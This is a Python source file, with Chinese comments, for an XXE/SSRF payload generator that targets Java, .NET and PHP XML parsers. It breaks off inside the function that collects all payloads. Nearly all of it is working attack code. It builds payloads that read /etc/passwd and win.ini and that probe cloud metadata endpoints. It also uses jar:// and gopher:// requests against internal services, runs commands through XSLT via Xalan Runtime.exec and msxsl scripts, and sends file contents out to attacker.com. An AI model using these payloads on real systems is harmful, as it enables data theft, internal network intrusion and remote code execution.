#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XXE/SSRF 漏洞探测工具 - 支持 Java/.NET 合规解析器
=================================================

用法示例:
    # 1. 列出所有可用的 payload 模板
    python xxe_scanner.py --list

    # 2. 生成 Local DTD Reuse payload（无需出网，最推荐）
    python xxe_scanner.py --mode local_dtd --target-file /etc/passwd --os linux

    # 3. 生成 Error-Based payload（需出网 + 回显错误信息）
    python xxe_scanner.py --mode error_based --attacker-url http://attacker.com --target-file /etc/passwd

    # 4. 生成 Blind SSRF payload（仅触发请求，无需回显）
    python xxe_scanner.py --mode blind_ssrf --ssrf-url http://169.254.169.254/latest/meta-data/

    # 5. 生成 XInclude payload（注入到 XML body，不需要 DOCTYPE）
    python xxe_scanner.py --mode xinclude --target-file /etc/passwd

    # 6. 生成 Schema Location SSRF payload
    python xxe_scanner.py --mode schema_ssrf --ssrf-url http://169.254.169.254/latest/meta-data/

    # 7. 自动探测模式：批量生成所有适用 payload
    python xxe_scanner.py --mode auto --attacker-url http://attacker.com --target-file /etc/passwd --os linux

    # 8. 启动 HTTP 服务器托管恶意 DTD（配合 error_based 模式使用）
    python xxe_scanner.py --serve --port 8080 --target-file /etc/passwd

    # 9. 指定目标平台生成针对性 payload
    python xxe_scanner.py --mode local_dtd --platform java --os linux --target-file /etc/passwd
    python xxe_scanner.py --mode local_dtd --platform dotnet --os windows --target-file C:/Windows/win.ini

依赖:
    pip install requests  (仅自动发送模式需要，生成 payload 无需任何依赖)

作者说明:
    - 本工具仅用于授权安全测试
    - 针对 Java (Xerces/SAX/DOM) 和 .NET (XmlReader/XmlDocument) 的合规 XML 解析器
    - 同时保留对 PHP/libxml2 宽松解析器的兼容支持
"""

import argparse
import sys
import os
import json
import textwrap
from typing import Dict, List, Optional, Tuple
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import quote
import threading
import io

# ============================================================================
# 第一部分：已知本地 DTD 路径数据库
# ============================================================================
# 说明：Local DTD Reuse 攻击的核心是利用目标系统上已存在的 DTD 文件
# 每个条目包含：DTD 路径、可重定义的参数实体名称、适用平台

LOCAL_DTD_DATABASE: List[Dict] = [
    # ===== Linux 通用 =====
    {
        "path": "file:///usr/share/yelp/dtd/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "GNOME Yelp 帮助系统 (Ubuntu/Fedora 常见)",
        "confidence": "high"
    },
    {
        "path": "file:///usr/share/xml/fontconfig/fonts.dtd",
        "entity_name": "expr",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "Fontconfig 字体配置 DTD",
        "confidence": "medium"
    },
    {
        "path": "file:///usr/share/sgml/docbook/xml-dtd-4.1.2/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "DocBook XML DTD (RHEL/CentOS)",
        "confidence": "medium"
    },
    {
        "path": "file:///usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",
        "entity_name": "ISOamso",
        "os": "linux",
        "platform": ["java", "dotnet"],
        "description": "DocBook XML DTD 4.5 (Debian/Ubuntu)",
        "confidence": "medium"
    },
    # ===== Java/Tomcat 特有 =====
    {
        "path": "jar:file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity_name": "URI",
        "os": "linux",
        "platform": ["java"],
        "description": "Apache Tomcat JSP API (Docker 官方镜像路径)",
        "confidence": "high"
    },
    {
        "path": "jar:file:///opt/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity_name": "URI",
        "os": "linux",
        "platform": ["java"],
        "description": "Apache Tomcat JSP API (手动安装路径)",
        "confidence": "medium"
    },
    {
        "path": "jar:file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd",
        "entity_name": "xs-datatypes",
        "os": "linux",
        "platform": ["java"],
        "description": "Tomcat Servlet API XMLSchema DTD",
        "confidence": "medium"
    },
    {
        "path": "jar:file:///usr/share/java/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd",
        "entity_name": "URI",
        "os": "linux",
        "platform": ["java"],
        "description": "系统 JSP API jar (Debian 包管理安装)",
        "confidence": "low"
    },
    # ===== Spring Boot 嵌入式 =====
    {
        "path": "jar:file:///app/app.jar!/BOOT-INF/lib/tomcat-embed-core-*.jar!/javax/servlet/resources/XMLSchema.dtd",
        "entity_name": "xs-datatypes",
        "os": "linux",
        "platform": ["java"],
        "description": "Spring Boot 嵌入式 Tomcat (需确认 jar 版本)",
        "confidence": "low"
    },
    # ===== Windows =====
    {
        "path": "file:///C:/Windows/System32/wbem/xml/cim20.dtd",
        "entity_name": "CIMName",
        "os": "windows",
        "platform": ["java", "dotnet"],
        "description": "Windows WMI CIM DTD (Windows Server 2008+)",
        "confidence": "high"
    },
    {
        "path": "file:///C:/Windows/System32/wbem/xml/wmi20.dtd",
        "entity_name": "CIMName",
        "os": "windows",
        "platform": ["java", "dotnet"],
        "description": "Windows WMI DTD",
        "confidence": "high"
    },
    {
        "path": "file:///C:/Windows/System32/wbem/xml/wmi2xml.dtd",
        "entity_name": "CIMName",
        "os": "windows",
        "platform": ["java", "dotnet"],
        "description": "Windows WMI XML DTD (备选路径)",
        "confidence": "medium"
    },
    # ===== .NET 特有 =====
    {
        "path": "file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config",
        "entity_name": None,  # .NET machine.config 不是 DTD，但可探测文件存在
        "os": "windows",
        "platform": ["dotnet"],
        "description": ".NET Framework 配置 (探测用途)",
        "confidence": "low"
    },
]


# ============================================================================
# 第二部分：Payload 生成器
# ============================================================================

class XXEPayloadGenerator:
    """
    XXE Payload 生成器 - 支持合规解析器 (Java/.NET)

    核心技术路线：
    1. Local DTD Reuse (推荐) - 无需出网，利用目标本地已有 DTD 文件
    2. Error-Based XXE       - 需出网+回显错误，通过错误信息泄露数据
    3. Blind SSRF            - 仅触发请求，适合打内网服务
    4. XInclude              - 不需要 DOCTYPE，注入 XML body
    5. Schema Location SSRF  - 通过 XSD 验证触发请求
    6. OOB (带外数据外带)    - 经典方案，仅对宽松解析器有效
    """

    def __init__(self, target_file: str = "/etc/passwd",
                 attacker_url: str = "http://attacker.com",
                 ssrf_url: str = "http://169.254.169.254/latest/meta-data/",
                 target_os: str = "linux",
                 platform: str = "java"):
        """
        参数:
            target_file:  要读取的目标文件路径
            attacker_url: 攻击者服务器地址 (用于 OOB/Error-Based)
            ssrf_url:     SSRF 目标地址 (如云元数据端点)
            target_os:    目标操作系统 (linux/windows)
            platform:     目标平台 (java/dotnet/php)
        """
        self.target_file = target_file
        self.attacker_url = attacker_url.rstrip('/')
        self.ssrf_url = ssrf_url
        self.target_os = target_os
        self.platform = platform

    # ===================== 技术1: Local DTD Reuse =====================

    def generate_local_dtd_payload(self, dtd_entry: Optional[Dict] = None) -> List[Dict]:
        """
        生成 Local DTD Reuse payload
        
        原理：
        - XML 规范允许在外部 DTD 中展开参数实体嵌套
        - 通过引用目标系统本地的 DTD 文件，在该文件的上下文中执行恶意实体定义
        - 重定义本地 DTD 中已存在的参数实体为攻击载荷
        
        优势：
        - 无需攻击者服务器出网
        - 合规解析器完全支持
        - 绕过 WAF 对外部连接的检测
        
        限制：
        - 需要知道目标系统上存在哪个 DTD 文件
        - 需要应用层回显 XML 解析错误信息
        - 目标文件内容含 XML 特殊字符时可能截断
        
        使用方法：
        将生成的 payload 作为 XML 文档的 DOCTYPE 发送给目标。
        如果解析器抛出错误信息，其中将包含目标文件内容。
        """
        payloads = []

        # 筛选适用的本地 DTD
        if dtd_entry:
            candidates = [dtd_entry]
        else:
            candidates = [
                d for d in LOCAL_DTD_DATABASE
                if d["os"] == self.target_os
                and self.platform in d["platform"]
                and d["entity_name"] is not None
            ]

        for dtd in candidates:
            # 构造恶意实体重定义内容
            # 使用 HTML 实体编码避免嵌套引号冲突
            # &#x25; = %  &#x27; = '  &#x26; = &
            malicious_entity_value = (
                '\n'
                f'    <!ENTITY &#x25; xxe_file SYSTEM "file://{self.target_file}">\n'
                f'    <!ENTITY &#x25; xxe_eval "<!ENTITY &#x26;#x25; xxe_error SYSTEM '
                f'&#x27;file:///nonexistent_path/&#x25;xxe_file;&#x27;>">\n'
                f'    &#x25;xxe_eval;\n'
                f'    &#x25;xxe_error;\n'
                f'  '
            )

            payload_xml = (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % local_dtd SYSTEM "{dtd["path"]}">\n'
                f'  <!ENTITY % {dtd["entity_name"]} \'{malicious_entity_value}\'>\n'
                f'  %local_dtd;\n'
                f']>\n'
                f'<foo>xxe_test</foo>'
            )

            payloads.append({
                "name": f"local_dtd_reuse_{dtd['entity_name']}",
                "payload": payload_xml,
                "dtd_path": dtd["path"],
                "description": dtd["description"],
                "confidence": dtd["confidence"],
                "technique": "Local DTD Reuse (Error-Based)",
                "requirements": [
                    "解析器允许加载本地文件 (file:// 协议)",
                    "目标系统存在该 DTD 文件",
                    "应用层回显 XML 解析错误信息"
                ],
                "parser_support": {
                    "java_xerces": "✅ 支持",
                    "java_sax": "✅ 支持",
                    "dotnet_xmlreader": "✅ 需要 DtdProcessing.Parse",
                    "php_libxml2": "✅ 支持",
                }
            })

        return payloads

    # ===================== 技术2: Error-Based XXE =====================

    def generate_error_based_payload(self) -> Dict:
        """
        生成 Error-Based XXE payload (需要外部 DTD 服务器)
        
        原理：
        - 引用攻击者服务器上的恶意 DTD 文件
        - 恶意 DTD 中构造一个包含敏感文件内容的错误路径
        - 解析器尝试加载该路径时报错，错误信息中包含文件内容
        
        工作流程：
        1. 目标解析器加载攻击者服务器上的 evil.dtd
        2. evil.dtd 中 %file; 加载目标文件内容
        3. 将文件内容拼入一个不存在的文件路径
        4. 解析器报错: "无法打开 /nonexistent/<文件内容>"
        5. 应用层返回错误信息 → 数据泄露
        
        使用方法：
        1. 先用 --serve 启动本工具的 HTTP 服务器
        2. 将生成的 XML payload 发送给目标
        3. 观察响应中的错误信息
        """
        # 主 payload (发送给目标)
        payload_xml = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE foo [\n'
            f'  <!ENTITY % xxe SYSTEM "{self.attacker_url}/evil.dtd">\n'
            f'  %xxe;\n'
            f']>\n'
            f'<foo>xxe_error_test</foo>'
        )

        # 攻击者服务器上需要托管的 evil.dtd 内容
        evil_dtd_content = self._generate_evil_dtd()

        return {
            "name": "error_based_external_dtd",
            "payload": payload_xml,
            "evil_dtd": evil_dtd_content,
            "technique": "Error-Based XXE via External DTD",
            "description": "通过外部 DTD 中的嵌套实体展开触发包含敏感数据的错误信息",
            "requirements": [
                "目标解析器允许加载外部 DTD (HTTP 出网)",
                "应用层回显 XML 解析错误信息",
                "攻击者服务器可被目标访问"
            ],
            "parser_support": {
                "java_xerces": "⚠️ 需显式启用外部实体",
                "java_sax": "⚠️ 需显式启用外部实体",
                "dotnet_xmlreader": "⚠️ 需 DtdProcessing.Parse + XmlUrlResolver",
                "php_libxml2": "✅ 默认支持",
            },
            "server_instructions": (
                f"在攻击者服务器 ({self.attacker_url}) 上托管以下内容为 /evil.dtd:\n"
                f"---\n{evil_dtd_content}\n---"
            )
        }

    def _generate_evil_dtd(self) -> str:
        """生成用于 Error-Based 攻击的外部 DTD 文件内容"""
        return (
            f'<!ENTITY % file SYSTEM "file://{self.target_file}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f'\'file:///nonexistent_xxe_error/&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%error;\n'
        )

    # ===================== 技术3: Blind SSRF =====================

    def generate_blind_ssrf_payload(self) -> List[Dict]:
        """
        生成 Blind SSRF payload
        
        原理：
        - 合规解析器虽然不在 SYSTEM 标识符内展开参数实体
        - 但会对 SYSTEM 中的字面 URL 发起 HTTP 请求
        - 这本身就构成 SSRF，只是无法获取响应内容
        
        适用场景：
        - 触发内网服务的副作用操作 (如 Redis 未授权、内网 API)
        - 探测内网主机/端口存活状态 (通过响应时间差)
        - 触发 DNS 请求确认漏洞存在
        - 访问云服务元数据端点
        
        使用方法：
        发送 payload，观察：
        - 攻击者 DNS 服务器是否收到查询 (推荐用 Burp Collaborator/interact.sh)
        - 响应时间是否因内网请求而变化
        - 目标行为是否因 SSRF 触发了内网操作而改变
        """
        payloads = []

        # 方式1: 通过参数实体 SYSTEM 触发
        payloads.append({
            "name": "blind_ssrf_parameter_entity",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % ssrf SYSTEM "{self.ssrf_url}">\n'
                f'  %ssrf;\n'
                f']>\n'
                f'<foo>blind_ssrf_test</foo>'
            ),
            "technique": "Blind SSRF via Parameter Entity",
            "description": "通过参数实体加载触发对目标 URL 的 HTTP 请求"
        })

        # 方式2: 通过通用实体 SYSTEM 触发
        payloads.append({
            "name": "blind_ssrf_general_entity",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY ssrf SYSTEM "{self.ssrf_url}">\n'
                f']>\n'
                f'<foo>&ssrf;</foo>'
            ),
            "technique": "Blind SSRF via General Entity",
            "description": "通过通用实体引用触发请求 (需要实体内容在 XML 中被引用)"
        })

        # 方式3: 通过 DOCTYPE SYSTEM 本身触发 (DTD 加载即 SSRF)
        payloads.append({
            "name": "blind_ssrf_doctype_system",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo SYSTEM "{self.ssrf_url}">\n'
                f'<foo>blind_ssrf_doctype</foo>'
            ),
            "technique": "Blind SSRF via DOCTYPE SYSTEM",
            "description": "最简形式: DOCTYPE 的 SYSTEM 标识符本身触发 HTTP 请求"
        })

        # 方式4: DNS 探测 (用于确认 XXE 存在)
        dns_payload_url = f"{self.attacker_url.replace('http://', '').replace('https://', '')}"
        payloads.append({
            "name": "blind_ssrf_dns_canary",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % dns_probe SYSTEM "http://xxe-confirm.{dns_payload_url}/probe">\n'
                f'  %dns_probe;\n'
                f']>\n'
                f'<foo>dns_canary</foo>'
            ),
            "technique": "DNS Canary for XXE Confirmation",
            "description": "通过 DNS 查询确认 XXE 漏洞存在 (配合 Collaborator/interact.sh)"
        })

        for p in payloads:
            p["requirements"] = [
                "解析器允许处理 DTD (DtdProcessing != Prohibit)",
                "解析器允许发起网络请求 (XmlResolver 未被禁用)"
            ]
            p["parser_support"] = {
                "java_xerces": "⚠️ 默认关闭外部实体，需显式开启",
                "dotnet_xmlreader": "⚠️ 需 DtdProcessing.Parse + XmlUrlResolver",
                "php_libxml2": "✅ 默认可触发",
            }

        return payloads

    # ===================== 技术4: XInclude =====================

    def generate_xinclude_payload(self) -> List[Dict]:
        """
        生成 XInclude 注入 payload
        
        原理：
        - XInclude 是独立于 DTD 的 XML 内容包含机制
        - 不需要 DOCTYPE 声明，直接在 XML body 元素中使用
        - 通过 xi:include 元素读取本地文件或发起网络请求
        
        适用场景：
        - 应用将用户输入拼接到 XML body 中 (如 SOAP 参数)
        - 无法控制 DOCTYPE 声明部分
        - 如: <user>{用户输入}</user> → 注入 XInclude 元素
        
        使用方法：
        将 XInclude payload 注入到应用的 XML 输入字段中。
        例如，如果应用期望: <name>John</name>
        则注入: <name><xi:include .../>John</name>
        
        注意：需要目标应用启用了 XInclude 处理:
        - Java: DocumentBuilderFactory.setXIncludeAware(true)
        - .NET: 默认不支持，极少见
        """
        payloads = []

        # 文件读取
        payloads.append({
            "name": "xinclude_file_read",
            "payload": (
                f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                f'  <xi:include parse="text" href="file://{self.target_file}"/>\n'
                f'</foo>'
            ),
            "injection_fragment": (
                f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                f'parse="text" href="file://{self.target_file}"/>'
            ),
            "technique": "XInclude File Read",
            "description": "通过 XInclude 以文本模式读取本地文件"
        })

        # SSRF
        payloads.append({
            "name": "xinclude_ssrf",
            "payload": (
                f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                f'  <xi:include parse="text" href="{self.ssrf_url}"/>\n'
                f'</foo>'
            ),
            "injection_fragment": (
                f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                f'parse="text" href="{self.ssrf_url}"/>'
            ),
            "technique": "XInclude SSRF",
            "description": "通过 XInclude 发起 HTTP 请求并可能获取响应内容"
        })

        # 带 fallback 的版本 (防止解析器报错中断)
        payloads.append({
            "name": "xinclude_with_fallback",
            "payload": (
                f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                f'  <xi:include parse="text" href="file://{self.target_file}">\n'
                f'    <xi:fallback>XINCLUDE_FAILED</xi:fallback>\n'
                f'  </xi:include>\n'
                f'</foo>'
            ),
            "injection_fragment": (
                f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                f'parse="text" href="file://{self.target_file}">'
                f'<xi:fallback>FAILED</xi:fallback></xi:include>'
            ),
            "technique": "XInclude with Fallback",
            "description": "带 fallback 的 XInclude (即使失败也不会中断解析)"
        })

        for p in payloads:
            p["requirements"] = [
                "应用启用了 XInclude 处理",
                "Java: setXIncludeAware(true) + setNamespaceAware(true)",
                "可将 XML 元素注入到文档 body 中"
            ]
            p["parser_support"] = {
                "java_xerces": "⚠️ 需 setXIncludeAware(true)",
                "dotnet_xmlreader": "❌ 默认不支持",
                "php_libxml2": "⚠️ 需 LIBXML_XINCLUDE flag",
            }

        return payloads

    # ===================== 技术5: Schema Location SSRF =====================

    def generate_schema_ssrf_payload(self) -> List[Dict]:
        """
        生成基于 XML Schema 验证的 SSRF payload
        
        原理：
        - xsi:schemaLocation / xsi:noNamespaceSchemaLocation 属性
          指示解析器从指定 URL 加载 XSD Schema 文件
        - 如果解析器配置了 Schema 验证，会对该 URL 发起请求
        - 不需要 DOCTYPE 声明，可绕过 WAF 对 <!DOCTYPE/<!ENTITY 的检测
        
        使用方法：
        在 XML 根元素上添加 xsi:noNamespaceSchemaLocation 或 xsi:schemaLocation 属性。
        
        注意：
        - Java: 需要 SchemaFactory 或 setValidating(true) + SchemaFactory
        - .NET: 需要 XmlReaderSettings.ValidationType = ValidationType.Schema
        """
        payloads = []

        # noNamespaceSchemaLocation (最简单)
        payloads.append({
            "name": "schema_ssrf_no_namespace",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
                f'     xsi:noNamespaceSchemaLocation="{self.ssrf_url}">\n'
                f'  test\n'
                f'</foo>'
            ),
            "technique": "Schema Location SSRF (noNamespace)",
            "description": "通过 xsi:noNamespaceSchemaLocation 触发 HTTP 请求"
        })

        # schemaLocation (命名空间版)
        payloads.append({
            "name": "schema_ssrf_with_namespace",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<foo xmlns="http://example.com/schema"\n'
                f'     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
                f'     xsi:schemaLocation="http://example.com/schema {self.ssrf_url}">\n'
                f'  test\n'
                f'</foo>'
            ),
            "technique": "Schema Location SSRF (namespaced)",
            "description": "通过 xsi:schemaLocation 触发 HTTP 请求"
        })

        # 多目标探测 (一次请求探测多个内网地址)
        payloads.append({
            "name": "schema_ssrf_multi_probe",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<foo xmlns:ns1="http://a.example.com"\n'
                f'     xmlns:ns2="http://b.example.com"\n'
                f'     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
                f'     xsi:schemaLocation="\n'
                f'       http://a.example.com http://169.254.169.254/latest/meta-data/\n'
                f'       http://b.example.com http://192.168.1.1:8080/\n'
                f'     ">\n'
                f'  test\n'
                f'</foo>'
            ),
            "technique": "Schema Location Multi-SSRF",
            "description": "单次请求探测多个内网地址"
        })

        for p in payloads:
            p["requirements"] = [
                "应用对 XML 执行 Schema 验证",
                "Java: SchemaFactory.newSchema() 或 Validator",
                ".NET: ValidationType = ValidationType.Schema"
            ]
            p["parser_support"] = {
                "java_xerces": "⚠️ 需启用 Schema 验证",
                "dotnet_xmlreader": "⚠️ 需启用 Schema 验证",
                "php_libxml2": "⚠️ 需 LIBXML_SCHEMA_CREATE flag",
            }

        return payloads

    # ===================== 技术6: Java 特有协议 =====================

    def generate_java_specific_payload(self) -> List[Dict]:
        """
        生成 Java 特有协议的 SSRF/XXE payload
        
        jar:// 协议：
        - Java 会先通过 HTTP 下载远程 jar 文件到临时目录
        - 然后从 jar 中解压指定路径的文件
        - HTTP 下载本身就是 SSRF
        - 攻击者可通过延迟 HTTP 响应保持连接 (用于信息侧信道)
        
        netdoc:// 协议 (旧版 JDK)：
        - 部分 JDK 7/8 早期版本支持
        - 功能类似 file://，可绕过 WAF 对 file:// 的检测
        
        使用方法：
        直接替换 SYSTEM 标识符中的 URL 协议即可。
        """
        payloads = []

        # jar:// SSRF
        payloads.append({
            "name": "java_jar_ssrf",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % jar_ssrf SYSTEM "jar:{self.attacker_url}/evil.jar!/test.txt">\n'
                f'  %jar_ssrf;\n'
                f']>\n'
                f'<foo>jar_ssrf_test</foo>'
            ),
            "technique": "SSRF via jar:// protocol",
            "description": (
                "Java 的 jar: URL 处理器会对远程 jar 文件发起 HTTP 请求。"
                "即使 jar 文件不存在或格式无效，HTTP 请求已经发出。"
            )
        })

        # jar:// 时间延迟探测 (判断漏洞存在)
        payloads.append({
            "name": "java_jar_timing",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % timing SYSTEM "jar:http://attacker.com:9999/delay.jar!/x">\n'
                f'  %timing;\n'
                f']>\n'
                f'<foo>timing_test</foo>'
            ),
            "technique": "jar:// Timing-Based Detection",
            "description": (
                "攻击者服务器延迟发送 HTTP 响应，如果目标解析时间相应延长，"
                "则确认存在 XXE 且 jar:// 协议可用。"
            )
        })

        # netdoc:// (旧版 JDK)
        payloads.append({
            "name": "java_netdoc_file_read",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY xxe SYSTEM "netdoc://{self.target_file}">\n'
                f']>\n'
                f'<foo>&xxe;</foo>'
            ),
            "technique": "File Read via netdoc:// (Legacy JDK)",
            "description": "netdoc:// 是 file:// 的别名，可绕过对 file:// 的 WAF 规则 (仅旧版 JDK)"
        })

        # gopher:// (极旧版本 Java，现代版本已移除)
        payloads.append({
            "name": "java_gopher_ssrf",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % gopher SYSTEM "gopher://internal-redis:6379/_SET%20key%20value">\n'
                f'  %gopher;\n'
                f']>\n'
                f'<foo>gopher_ssrf</foo>'
            ),
            "technique": "SSRF via gopher:// (Legacy JDK only)",
            "description": (
                "gopher:// 允许发送任意 TCP 数据，可攻击 Redis/Memcached 等内网服务。"
                "注意: JDK 8+ 已移除 gopher 支持，仅 JDK 7 及更早版本有效。"
            )
        })

        for p in payloads:
            p["requirements"] = [
                "目标使用 Java XML 解析器",
                "解析器允许处理外部实体"
            ]
            p["parser_support"] = {
                "java_xerces": "✅ jar:// 默认可用",
                "dotnet_xmlreader": "❌ 不支持 jar://",
                "php_libxml2": "❌ 不支持 jar://",
            }

        return payloads

    # ===================== 技术7: XSLT 注入 =====================

    def generate_xslt_payload(self) -> List[Dict]:
        """
        生成 XSLT 注入 payload
        
        原理：
        - 如果目标应用对 XML 执行 XSLT 转换，攻击面大幅扩展
        - document() 函数可读取本地/远程资源
        - Java Xalan 引擎支持调用任意 Java 方法 (可达 RCE)
        - .NET XSLT 支持 C# 脚本内联执行
        
        适用场景：
        - 目标应用允许上传/指定 XSLT 样式表
        - XML 输入中可注入 XSLT processing instruction
        
        使用方法：
        将 XSLT payload 作为样式表提交，或注入到 XML 处理管线中。
        """
        payloads = []

        # document() SSRF / 文件读取
        payloads.append({
            "name": "xslt_document_ssrf",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n'
                f'  <xsl:template match="/">\n'
                f'    <result>\n'
                f'      <xsl:copy-of select="document(\'{self.ssrf_url}\')"/>\n'
                f'    </result>\n'
                f'  </xsl:template>\n'
                f'</xsl:stylesheet>'
            ),
            "technique": "XSLT document() SSRF",
            "description": "通过 XSLT document() 函数发起 HTTP 请求并获取响应"
        })

        # document() 文件读取
        payloads.append({
            "name": "xslt_document_file_read",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n'
                f'  <xsl:template match="/">\n'
                f'    <result>\n'
                f'      <xsl:value-of select="document(\'file://{self.target_file}\')"/>\n'
                f'    </result>\n'
                f'  </xsl:template>\n'
                f'</xsl:stylesheet>'
            ),
            "technique": "XSLT document() File Read",
            "description": "通过 XSLT document() 读取本地文件 (文件需为有效 XML)"
        })

        # Java Xalan RCE (执行系统命令)
        payloads.append({
            "name": "xslt_java_rce_runtime",
            "payload": (
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n'
                f'                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"\n'
                f'                xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"\n'
                f'                version="1.0">\n'
                f'  <xsl:template match="/">\n'
                f'    <xsl:variable name="rtObj" select="rt:getRuntime()"/>\n'
                f'    <xsl:variable name="process" select="rt:exec($rtObj, \'id\')"/>\n'
                f'    <result>\n'
                f'      <xsl:value-of select="ob:toString($process)"/>\n'
                f'    </result>\n'
                f'  </xsl:template>\n'
                f'</xsl:stylesheet>'
            ),
            "technique": "XSLT Java RCE via Xalan Extension",
            "description": (
                "通过 Xalan 的 Java 扩展机制调用 Runtime.exec() 执行命令。"
                "仅在目标使用 Xalan 引擎且未禁用扩展函数时有效。"
            )
        })

        # .NET XSLT 脚本执行
        payloads.append({
            "name": "xslt_dotnet_script",
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n'
                '                xmlns:msxsl="urn:schemas-microsoft-com:xslt"\n'
                '                xmlns:cs="urn:custom-script"\n'
                '                version="1.0">\n'
                '  <msxsl:script language="C#" implements-prefix="cs">\n'
                '    <![CDATA[\n'
                '      public string Execute() {\n'
                '        return System.IO.File.ReadAllText(@"C:\\Windows\\win.ini");\n'
                '      }\n'
                '    ]]>\n'
                '  </msxsl:script>\n'
                '  <xsl:template match="/">\n'
                '    <result><xsl:value-of select="cs:Execute()"/></result>\n'
                '  </xsl:template>\n'
                '</xsl:stylesheet>'
            ),
            "technique": "XSLT .NET Script Execution",
            "description": (
                "通过 .NET XSLT 的 msxsl:script 扩展执行 C# 代码。"
                "需要 XsltSettings.EnableScript = true。"
            )
        })

        for p in payloads:
            p["requirements"] = [
                "目标应用对输入执行 XSLT 转换",
                "攻击者可控制 XSLT 样式表内容"
            ]

        return payloads

    # ===================== 技术8: OOB 经典方案 (宽松解析器) =====================

    def generate_oob_classic_payload(self) -> Dict:
        """
        生成经典 OOB (Out-of-Band) 数据外带 payload
        
        注意: 此技术仅对宽松解析器 (PHP/libxml2) 有效！
        对 Java/.NET 合规解析器无效，保留仅为向后兼容。
        
        原理：
        - 利用参数实体在 SYSTEM 标识符内被违规展开的行为
        - 将目标文件内容拼接到攻击者 URL 中发送出去
        - 合规解析器不会在此上下文展开参数实体 → 失败
        """
        payload_xml = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE foo [\n'
            f'  <!ENTITY % xxe SYSTEM "{self.attacker_url}/oob.dtd">\n'
            f'  %xxe;\n'
            f']>\n'
            f'<foo>oob_classic</foo>'
        )

        oob_dtd = (
            f'<!ENTITY % file SYSTEM "file://{self.target_file}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
            f'\'http://{self.attacker_url.replace("http://", "").replace("https://", "")}'
            f'/?data=&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%exfil;\n'
        )

        return {
            "name": "oob_classic_libxml2_only",
            "payload": payload_xml,
            "evil_dtd": oob_dtd,
            "technique": "Classic OOB XXE (libxml2/PHP ONLY)",
            "description": "经典 OOB 外带方案 - 仅对 PHP/libxml2 宽松解析器有效",
            "warning": "⚠️ 对 Java/.NET 合规解析器无效！",
            "parser_support": {
                "java_xerces": "❌ 合规解析器不支持",
                "dotnet_xmlreader": "❌ 合规解析器不支持",
                "php_libxml2": "✅ 有效",
            }
        }

    # ===================== 综合生成 =====================

    def generate_all_payloads(self) -> Dict[str, list]:
        """
        生成所有适用于当前配置的 payload
        
        返回按技术分类的 payload 字典
        """
        results = {
            "local_dtd_reuse": self.generate_local_dtd_payload(),
            "error_based": [self.generate_error_based_payload()],
            "blind_ssrf": self.generate_blind_ssrf_payload(),
            "xinclude": self.generate_xinclude_payload(),
            "schema_ssrf": self.generate_schema_ssrf_payload(),
